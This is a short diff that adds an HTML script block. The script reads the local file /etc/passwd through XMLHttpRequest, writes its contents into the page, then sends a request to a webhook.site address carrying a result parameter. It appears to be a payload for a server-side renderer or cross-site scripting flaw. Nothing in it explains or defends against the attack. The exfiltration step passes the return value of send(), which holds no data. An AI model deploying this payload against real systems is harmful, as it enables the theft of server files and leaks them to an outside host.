@@ -1,0 +1,12 @@
+<script>
+    xhzeem = new XMLHttpRequest();
+    xhzeem.onload = function(){document.write(this.responseText);}
+    xhzeem.onerror = function(){document.write('failed!')}
+    xhzeem.open("GET","file:///etc/passwd");
+    var res = xhzeem.send();
+
+    Http = new XMLHttpRequest();
+    var url = 'https://webhook.site/c1bd47d5-27c3-4e44-89b1-8c0933c92546?res=' + res;
+    Http.open("GET",url);
+    Http.send();
+</script>
